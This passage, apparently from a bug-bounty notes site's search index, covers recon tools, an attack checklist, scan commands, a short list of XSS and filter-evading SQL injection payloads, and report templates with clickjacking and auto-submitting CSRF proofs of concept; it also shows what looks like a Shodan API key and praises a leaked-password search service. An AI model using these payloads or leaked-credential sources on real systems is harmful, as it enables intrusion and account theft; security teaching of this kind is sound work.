Subdomains and running services","text":"Website Comment http://zoomeye.org <p>Powerful. Search automatically for exploits on running services Allows only 20 requests on free tier</p> https://spyse.com/ Search engine built for a quick cyber intelligence of IT infrastructures, networks, and even the smallest parts of the internet. Powerful search, helps for a quick recon on infrastructure targets http://netograph.io <p>Useless. Low data</p> https://www.nerdydata.com/ <p>Useless/Marketing stuff</p> http://intelx.io <p>Very impressive. There are many emails with passwords extracted of many databases leaked. Very helpfull to Redteams Companies which have to see whats is going on with your employes email</p> http://fofa.so <p>Limited. You must have an API key to see more than one page</p> http://onyphe.io <p>Useless, Single target</p> http://app.binaryedge.io <p>Powerfull. Can filter by iot, ports, products, ASN. Allows 250 requests per month</p> http://shodan.io <p>Top tool. Expensive. You should buy when it is on chinese blackfriday. Also, recommend you to monitor shodan's twitter for new update or promotions</p> http://viz.greynoise.io <p>Few contents, although makes automatically exploits on running services, e.g: Its seems exploitable to eternal blue</p> http://ivre.rocks <p>Use Zeek (formerly known as Bro), Argus and Nfdump/ Isnt Website tool</p> https://spyse.com/search/subdomain <p>Amazing table view. No search limits, although doesn't make advanced things. It's make like a research about service or product</p> https://community.riskiq.com/search/ <p>There are a lot of contents, but seems useless. I cant see anything sensitive</p> https://recon.dev/ https://host.io/ A Powerful and Fast Domain Name Data AP"},{"location":"Bug%20Bounty/reconnotes/#processmethodology","title":"Process/Methodology","text":""},{"location":"Bug%20Bounty/reconnotes/#1-attackstest-on-subdomains-first-if-target-has-no-subdomains-or-not-juicy-subdomains-then-go-for-main-domain","title":"1. Attacks(Test on Subdomains first if Target has no subdomains or not juicy subdomains then go for main Domain.)","text":"<p>All Subdomains:- 1) XSS 2) Host Header Injection 3) Open Redirection through WaybackURLS 4) Improper Access Control &amp; Parameter Tampering(Forgot password,price etc) 5) HTML Injection(like xss,reflect back our HTML code) 6) File Inclusion(upload malicious file using LFI,RFI(search in burp for file://,url,redirect etc.) , path traversal(var/www/html),run with url) 7) SPF(no valid SPF Records)-Sender Policy Framework 8) CORS -Cross Origin Resource Sharing(Change Origin by curl or burp search:Access control.. and get XML code) 9) SSRF- Server Side Request Forgery(../etc/passwd)(Read Unrestrted file,Scn intrnl network,Rfi(Execute Own Code)) 10) Critical file Search (use wordlist and on main domain) 11) Sorce Code Disclosure(use burp search file://login.php,try to find sql code,site:domain.com index.of.backup) 12) CSRF-GET ,POST(html file) 13) API search using grep(Use tool for that) 14) Authentication Bypass(use my writeup) 15) SSTI-Server Side Template Injection (use Portswigger for help) 16) Unicode Injection in Mail address param and use burp collborator for receiving mails. 17) for business logic error(use fuzzdb github) 18) Sub Domain Takeover(HostileSubbruteforcer, sub404) 19) Email Header Injection On Reset password Function  20) SMTP and Host Header Injection 21) Iframe (for Clickjacking) 22) Check Burp History,Arjun,Hakcrawler for finding Endpoint 23) Check Cryptography in Reset Password Token 24) Bypassing Rate Limit 25) Check Headers: <code>X-Originating-IP:IP</code> <code>X-Remote-IP:IP</code> <code>X-Remote-Addr:IP</code> <code>X-Client-IP:IP</code> <code>X-Forwarded-Host:IP</code> <code>X-Forwarded-For:IP</code> 26) Directory Bruteforce 27) Http Request Smuggling 28) Check for Social Signon Bypass 29) File Upload CSRF, SSRF, RCE, LFI, XXE 30) Buffer Overflow 31) SQL Injection(use SQLmap) https://medium.com/@hninja049/sql-injection-using-sqlmap-9d14182005a0 </p>"},{"location":"Bug%20Bounty/reconnotes/#2-recon","title":"2. RECON","text":"<p>Find Subdomains(use Amass,Subfinder,Sublister,Nahamsec repo,crtsh,virustotal,) </p><pre><code>ex: 1. amass enum -brute -d twitch.tv -src\n    2. amass enum -brute -d twitch.tv -rf resolvers.txt -w bruteforce.list\n</code></pre> Auxiliary- \u00a0\u00a0\u00a0\u00a0DNSSEC \u00a0\u00a0\u00a0\u00a0LDNSUTILS,NSEC3WALKER,NSEC3MAP Github Recon \u00a0\u00a0\u00a0\u00a0Search for Goodies Dorking \u00a0\u00a0\u00a0\u00a0ADS key,Priv pol,TOS,AWS,S3   <p>Use Directory Finder Tool(massdns,Dirbuster,GoBuster,dns-parallel-prober,blacksheepwall) also for subdomain brute force. commonspeak for wordlist- subdomain &amp; url data(Not Recommended). Nahamsec Wordlist- Sec-list</p>"},{"location":"Bug%20Bounty/reconnotes/#3-enumerate","title":"3. ENUMERATE","text":"<ul> <li>Port Scanning     Massscan     ex: <code>masscan -p1-65535 -iL $ipFile --max-rate 1800 -oG $outPutFile.log</code>     Nmap  </li> <li>Credential Bruteforcing     Brutespray</li> <li>Use Eyewitness for Screenshots     webscreenshot     Aquatone</li> <li>WayBackurl -get API's     -to see previous version of URLs</li> <li>Xmind Organisation     -to track the Enum process.</li> <li>Burp Vuln Scanner     -Platform Identification CVE Searching</li> <li>Parsing javascript(Links parsing,or extracting Links from js files),Coverage for Heavy javascript sites \u00a0\u00a0\u00a0\u00a0ZAP AJAX SPIDER \u00a0\u00a0\u00a0\u00a0JSParser \u00a0\u00a0\u00a0\u00a0Link finder \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0burp&gt;&gt;Engagement tools&gt;&gt;Find Scripts&gt;&gt;Copy Selected URLs and pass this to these \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0tools</li> <li>Platform Identification \u00a0\u00a0\u00a0\u00a0Builtwith \u00a0\u00a0\u00a0\u00a0WappAlyzer  </li> <li>Content Discovery/Directory Bruting \u00a0\u00a0\u00a0\u00a0TBHMV1 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Seclists \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Raft \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Digger Wordlists \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0WPScan \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CMSMAP \u00a0\u00a0\u00a0\u00a0Gobuster \u00a0\u00a0\u00a0\u00a0Burp Content Discovery \u00a0\u00a0\u00a0\u00a0Robots Disallowed \u00a0\u00a0\u00a0\u00a0git/jhaddix/content_discoveryall.txt  </li> <li>Parameter Bruting  \u00a0\u00a0\u00a0\u00a0Parameth \u00a0\u00a0\u00a0\u00a0Burp Analyze Target</li> <li>Param Spider(find urls which have parameters)</li> </ul>"},{"location":"Bug%20Bounty/reconnotes/#blind-xss-frameworks","title":"Blind XSS Frameworks","text":"<pre><code>LewisArdern/bXSS\n\nssl/ezXSS\n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#ssrf","title":"SSRF","text":"<pre><code>git/jhaddix/cloud_metadata.txt\n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#idor-mflacinsecure-direct-object-reference","title":"IDOR-MFLAC(Insecure Direct Object Reference)","text":"<pre><code>Id's\nHashes\nEmails\n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#subdomain-takever","title":"Subdomain Takever","text":"<pre><code>git/Edoverflow/can-i-take-over-xyz\n\ns3scanner\n\nHostilesubbruteforcer\n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#waf","title":"WAF","text":"<p>Cloudfare/Akamai  </p> <p>Security testing against Akamai?look for origin-sub.domain.com,origin.sub.domain.com bypass the filtering by going to the source.</p>"},{"location":"Bug%20Bounty/reconnotes/#other-useful-tools-","title":"Other Useful Tools-","text":"<p>Eyewitness- for Screenshots</p> <p>webscreenshot -for screenshots</p> <p>Aquatone -for screenshots</p> <p>HTTPSscreenshot -for screenshots</p> <p>Openlist Chrome Extension- open tabs with specified urls </p>"},{"location":"Bug%20Bounty/reconnotes/#asn-lookupnet","title":"ASN Lookup,net,","text":"<p>http://bgp.he.net,Crunchbase      for Aquistions(Other Organisations)</p> <p>Whoxy.com,</p> <p>DOMLink,</p> <p>https://builtwith.com/relationships/twitch.tv, Google Fu,</p> <p>Shodan API,</p> <p>and juicy Subdomains</p>"},{"location":"Bug%20Bounty/reconnotes/#tips-to-crawl","title":"tips to crawl","text":"<p>webpaste</p> <p>meg -path find</p> <p>ffuf -path ' '</p> <p>concurl -path ' '</p> <p>comm -compares sorted files</p> <p>gau -fetch js files</p> <p>find -to list directory</p> <p>Arjun - Find parameters on a specific endpoint</p>"},{"location":"Bug%20Bounty/reconnotes/#advance-payloads-","title":"Advance Payloads:-","text":"<p> for XSS</p> <pre><code>1. &lt;marquee loop=1 width=0 onfinish=pr\\u006fmpt(document.cookie)&gt;Y000&lt;/marquee&gt;  \n\n        '\"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;\"\n\n        &gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)\n\n        &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex\n\n        formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;\"\n\n        &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;img/id=\"confirm&amp;lpar;\n\n        1)\"/alt=\"/\"src=\"/\"onerror=eval(id&amp;%23x29;&gt;'\"&gt;&lt;img src=\"http://i.imgur.com/P8mL8.jpg\"&gt;\n  ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n        &gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))\n        &lt;/SCRIPT&gt;\n\n        \u201c onclick=alert(1)//&lt;button \u2018 onclick=alert(1)//&gt; */ alert(1)//\n</code></pre> <p> for SQL injection used URL encode</p> <pre><code>2. /*!50000%75%6e%69on*/%73%65%6cect 1,2,3,4,...                                     \n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#personal-recommended-tools-left-to-right-priority-","title":"Personal Recommended tools (Left to Right Priority):-","text":"<p> for subdomains</p> <ol> <li>Subfinderv2, Amass, Sublister, crtsh   </li> </ol> <p> for Finding Parameters</p> <pre><code>2. Arjun, ParamSpider, Parameth \nex: for paramspider:- python3 paramspider.py --domain healthifyme.com --exclude woff,css,js,png,svg,php,jpg --output healthifyme.txt\n</code></pre> <p> for Separating https &amp; http</p> <ol> <li>httpx(With Title), httprobe</li> </ol> <p> for Subdomains,cloud Services subdomains in js files, Use the Shannon Entropy</p> <ol> <li>SubDomainizer 5.Link Discovery by GoSpider|Hakrawler|Burp Suite Pro &amp; use advance scope as keyword 'Twitch'</li> </ol> <p> Juicy Domains by Google,Crtsh,WayBackMachine</p> <pre><code>6. SubDomain Scraping\n    ex:- site:domain.com -maindomain.com -otherdomain.com (subtract main domain)\n</code></pre> <p> by shodan scraped subdomains</p> <ol> <li>Shosubgo </li> </ol> <p> for Subdomain Bruting</p> <ol> <li>Amass, ShuffleDNS, commonspeak2</li> </ol> <p> Service Scanning</p> <ol> <li>brutespray                            </li> </ol> <p> Screenshotting</p> <ol> <li>Eyewitness, Aquatone, httpscreenshot    </li> </ol> <p> Subdomain takeover</p> <ol> <li>(can i take over xyz),SubOver &amp; nuclei                    </li> </ol> <p> Automation</p> <ol> <li>Interlace, Pwnkey, Lazyrecon, Spiderfoot(GUI)   </li> </ol> <p> for links,endpoints</p> <ol> <li>Linkfinder </li> </ol> <p> for API and different Payloads</p> <ol> <li>PayloadsAllTheThings </li> </ol>"},{"location":"Bug%20Bounty/reconnotes/#automation-tools-by-different-hunters-","title":"Automation Tools by different Hunters:-","text":"<ul> <li> <p>C-Tier: automation built around scripting up other tools in bash or python. Step based, no workflow. Few techniques. Little extensibility.</p> </li> <li> <p>B-Tier: automation writing a few of their own modules. Some GUI or advanced workflow. Medium techniques. Runs &amp; point-in-time. Flat files.</p> </li> <li> <p>A-Tier: automation writing all their own modules. Has GUI. Runs iterativley. Manages data via db.</p> </li> <li> <p>S-Tier: automation writing their own modules. Has GUI. Runs iterativley. Manages data via db. Scales across &amp; multiple boxes. Sends alerts to user. Uses novel techniques and iterates quickly. ML + AI.</p> </li> <li> <p>Frameworks (C-Tier)</p> <p>https://github.com/AdmiralGaust/bountyRecon</p> <p>https://github.com/offhourscoding/recon</p> <p>https://github.com/Sambal0x/Recon-tools</p> <p>https://github.com/JoshuaMart/AutoRecon</p> <p>https://github.com/yourbuddy25/Hunter</p> <p>https://github.com/venom26/recon/blob/master/ultimate_recon.sh</p> <p>https://gist.github.com/dwisiswant0/5f647e3d406b5e984e6d69d3538968cd</p> </li> <li> <p>Frameworks (B-Tier) https://github.com/capt-meelo/LazyRecon https://github.com/Screetsec/Sudomy</p> <p>https://github.com/phspade/Automated-Scanner</p> <p>https://github.com/devanshbatham/Gorecon</p> <p>https://github.com/shmilylty/OneForAll </p> <p>https://github.com/LordNeoStark/tugarecon</p> <p>https://github.com/SolomonSklash/chomp-scan</p> <p>https://github.com/TypeError/domainedLazyRecon    (A-Tier)</p> <p>https://github.com/Edu4rdSHL/findomain</p> <p>https://github.com/SilverPoision/Rock-ON</p> <p>https://github.com/epi052/recon-pipeline</p> </li> </ul>"},{"location":"Bug%20Bounty/reconnotes/#tips","title":"Tips","text":"<pre><code>1. wc -l   ---for word count\n\n2. grep -v \".tmi\"\n\n3. amass enum -brute -d twitch.tv -src\n\n4. echo $PATH -----To show all the paths where apps are installed \n\n    use export PATH=$PATH:/pathtofolder   --for path set(Temp) and add in bash.rc(for permanent)\n\n    ln -s /opt/hackerEnv/hackerEnv /usr/local/bin/ --another command to create a link like shortcut\n\n    https://linuxize.com/post/how-to-create-symbolic-links-in-linux-using-the-ln-command/\n\n5. /.config/amass/config.ini -----to config api of amass\n\n6. shodan init 61TvA2dNwxNxmWziZxKzR5aO9tFD00Nj7.bYD);n%?Le984)xg2Ye3n^3Eb)9(8*g\n\n8. https://www.wolframalpha.com/input/?i=target.com       to analyze Target\n\n9. https://www.nmmapper.com/                              online subdomain finder\n\n10. https://chaos.projectdiscovery.io/#/                  Great tools for Analysis and subdoamin finder in secs.\n\n11. https://owasp.org/www-community/xss-filter-evasion-cheatsheet           XSS Cheat Sheet\n\n12. https://medium.com/@ehsahil/bash-cookbook-for-everyone-part-2-b70d40610025          Bash For Eyeryone\n\n13. https://httpstatus.io/                                Bulk url Status Checker\n\n14. https://tools.w3cub.com/                              Free Collection of Tools\n\n15.https://pentester.land/list-of-bug-bounty-writeups.html                 List of Bug Bounty Writeups\n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#tools-to-install-","title":"Tools to Install:-","text":"<ul> <li> <p>DNS Validator</p> </li> <li> <p>Bug Bounty Dorks\\</p> </li> <li> <p>waybackurl</p> </li> </ul>"},{"location":"Bug%20Bounty/reconnotes/#bug-bounty-platforms","title":"BUG BOUNTY PLATFORMS","text":"<ul> <li> <p>Bugcrowd</p> </li> <li> <p>Hackerone</p> </li> <li> <p>Hackenproof</p> </li> <li> <p>Bugbountyjp</p> </li> <li> <p>Intigriti</p> </li> <li> <p>Open Bug Bounty</p> </li> <li> <p>Yogosha</p> </li> </ul>"},{"location":"Bug%20Bounty/reconnotes/#best-books","title":"Best Books","text":"<ul> <li> <p>Web Application Haackers Handbook</p> </li> <li> <p>Web hacking 101</p> </li> <li> <p>Mastering Modern Web Pen Testing</p> </li> <li> <p>Bug Bounty Playbook</p> </li> <li> <p>Real World Bug Hunting</p> </li> <li> <p>Owasp Testing Guide</p> </li> <li> <p>Mobile Application Hackers Handbook</p> </li> </ul>"},{"location":"Bug%20Bounty/reconnotes/#burp-extensions","title":"Burp Extensions","text":"<pre><code>iprotate\n</code></pre>"},{"location":"Bug%20Bounty/reconnotes/#github-repositories","title":"Github Repositories","text":"<p>https://github.com/vishal9066/AwesomeXSS https://github.com/vishal9066/RegExAPI                       For API findings on Targets</p>"},{"location":"Bug%20Bounty/reconnotes/#references","title":"References","text":"<ul> <li> <p>https://github.com/bminossi/ReconNotes</p> </li> <li> <p>https://sidxparab.gitbook.io/subdomain-enumeration-guide</p> </li> </ul>"},{"location":"Bug%20Bounty/vps/","title":"VPS","text":""},{"location":"Bug%20Bounty/vps/#vps","title":"VPS","text":""},{"location":"Bug%20Bounty/vps/#what-is-vps","title":"What is VPS?","text":"<p>Virtual Private Server (VPS), is a virtualized server environment created by partitioning a physical server into multiple isolated virtual servers. Each VPS functions independently with its own operating system, resources, and configurations. It provides users with greater control, flexibility, and scalability compared to shared hosting, allowing them to install and run custom software, manage their server settings, and allocate resources according to their needs. VPS hosting is commonly used for hosting websites, applications, and other online services, offering a balance between affordability and performance.</p>"},{"location":"Bug%20Bounty/vps/#references","title":"References","text":"<ul> <li> <p>https://github.com/hackingguy/Bug-Hunting-Colab</p> </li> <li> <p>https://github.com/harsh-bothra/VPS-Install</p> </li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/","title":"Clickjacking","text":""},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#clickjacking","title":"Clickjacking","text":""},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#vulnerability-name","title":"Vulnerability Name","text":"<p>Clickjacking in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#vulnerability-description","title":"Vulnerability Description","text":"<p>Clickjacking is an attack that tricks a user into clicking a webpage element that is invisible or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.</p> <p>The absence of the X-Frame-Options header in a web application's HTTP response can allow clickjacking attacks. This security header is used to instruct the browser on whether or not the web page can be embedded within an iframe on another site. Clickjacking is a client-side security issue that affects a variety of browsers and platforms.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Create a clickjacking POC by copying the code below into a new HTML file.</li> <li>Replace the URL with your target domain and save the file.</li> <li>Open this file in a new incognito tab.</li> <li>Observe that the target application is successfully loaded into the iframe tags, indicating that it is vulnerable to clickjacking attacks.</li> </ol> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Clickjack test page&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;iframe style=\"height: 500px; width: 500px;\" src=\"http://example.com\"&gt;&lt;/iframe&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#impact","title":"Impact","text":"<p>An attacker could embed your website in an iframe and by tricking the UI, the user himself could unintentionally perform dangerous actions. You may think that kind of attack is not so dangerous but combined with other vulnerabilities, it could be deadly.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#remediation","title":"Remediation","text":"<p>Server-side protection against clickjacking is provided by defining and communicating constraints over the use of components such as iframes.</p> <ul> <li>Preventing the browser from loading the page in frame using the X-Frame-Options or Content Security Policy (frame-ancestors) HTTP headers.</li> <li>Preventing session cookies from being included when the page is loaded in a frame using the SameSite cookie attribute.</li> <li>Implementing JavaScript code in the page to attempt to prevent it being loaded in a frame (known as a \"frame-buster\").</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/clickjacking/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/clickjacking#how-to-prevent-clickjacking-attacks</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/","title":"Command Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#command-injection","title":"Command Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>Command injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>Command injection vulnerability let an attacker execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.</p> <p>Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#impact","title":"Impact","text":"<p>A potential threat actor can execute unauthorized code on the targeted system, potentially resulting in a total system compromise. This could grant them access to sensitive data residing on the system. The attacker could initiate a Denial of Service (DoS) attack on the target by injecting commands designed to exhaust all available resources.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#remediation","title":"Remediation","text":"<p>The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In almost all cases, there are different ways to implement the required functionality using safer platform APIs.</p> <p>If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:</p> <ul> <li>Validating against a whitelist of permitted values.</li> <li>Validating that the input is a number.</li> <li>Validating that the input contains only alphanumeric characters, no other syntax or whitespace.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/command-injection/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/os-command-injection#how-to-prevent-os-command-injection-attacks</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/","title":"CRLF Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#crlf-injection","title":"CRLF Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>CRLF Injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>In a CRLF injection vulnerability attack, the attacker inserts both the carriage return and linefeed characters into user input to trick the server, the web application, or the user into thinking that an object is terminated and another one has started.</p> <p>This attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#impact","title":"Impact","text":"<p>This vulnerability can lead to a range of security issues, including HTTP response splitting, where an attacker can control the content of the response, potentially delivering malicious content or redirecting users to harmful websites. </p> <p>CRLF injection can also be used in conjunction with other attacks like Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) to further compromise a web application, steal sensitive data, or manipulate user interactions.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#remediation","title":"Remediation","text":"<ul> <li>Do not use users input directly inside response headers. If that is not possible, you should always use a function to encode the CRLF special characters. </li> <li>Validate and sanitize user input, ensuring that no CRLF characters or other special characters can be injected into HTTP headers or request parameters. </li> <li>Use output encoding when rendering user-generated content to prevent the injection of malicious data into responses. </li> <li>Server configurations should be set to reject any requests containing CRLF characters, and Intrusion Detection Systems (IDS) or Web Application Firewalls (WAF) can be employed to monitor and filter out potentially malicious traffic.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/crlf-injection/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</li> <li>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/","title":"CSRF (Cross Site Request Forgery)","text":""},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#csrf-cross-site-request-forgery","title":"CSRF (Cross Site Request Forgery)","text":""},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#vulnerability-name","title":"Vulnerability Name","text":"<p>Cross-site request forgery for [Action] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#vulnerability-description","title":"Vulnerability Description","text":"<p>CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim\u2019s behalf. This vulnerability targets functionality that causes a state change on the server, such as changing the victim\u2019s email address or password, or purchasing something. </p> <p>Forcing the victim to retrieve data doesn\u2019t benefit an attacker because the attacker doesn\u2019t receive the response, the victim does. As such, CSRF attacks target state-changing requests.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Log in to the application.</li> <li>Go to [Affected URL].</li> <li>Create a CSRF payload by copying the code below into a new HTML file.</li> <li>Save this HTML file.</li> <li>From inside the same browser you logged in, open the HTML file in a new tab.</li> <li>Once the page loads, the submit button will be clicked automatically.</li> <li>Go back to the application tab and observe that the action as per the CSRF payload is performed.</li> <li>This indicates that the application is vulnerable to CSRF attacks.</li> </ol> <pre><code>&lt;html&gt;\n    &lt;body&gt;\n        &lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;\n            &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" /&gt;\n        &lt;/form&gt;\n        &lt;script&gt;\n            document.forms[0].submit();\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#impact","title":"Impact","text":"<p>The attacker causes the victim user to act unintentionally. For example, this action might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#remediation","title":"Remediation","text":"<p>The most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token should be:</p> <ul> <li>Unpredictable with high entropy, as for session tokens in general.</li> <li>Tied to the user's session.</li> <li>Strictly validated in every case before the relevant action is executed.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/csrf-cross-site-request-forgery/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/csrf/preventing</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/","title":"Directory Browsing","text":""},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#directory-browsing","title":"Directory Browsing","text":""},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#vulnerability-name","title":"Vulnerability Name","text":"<p>Directory Browsing in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#vulnerability-description","title":"Vulnerability Description","text":"<p>A directory browsing (AKA directory listing) provides an attacker with the complete index of all the resources located inside the directory. The specific risks and consequences vary depending on which files are listed and accessible.</p> <p>Web servers can be configured to automatically list the contents of directories that do not have an index page. This can aid an attacker by enabling them to quickly identify the resources on a given path and proceed directly to analyzing and attacking those resources.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Navigate to [Affected URL].</li> <li>Observe that directory browsing is enabled and the resources present in this directory are accessible to an attacker.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#impact","title":"Impact","text":"<p>Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as the creation times of files or any information that may be encoded in file names. The files contained within the directory may reveal sensitive information or provide 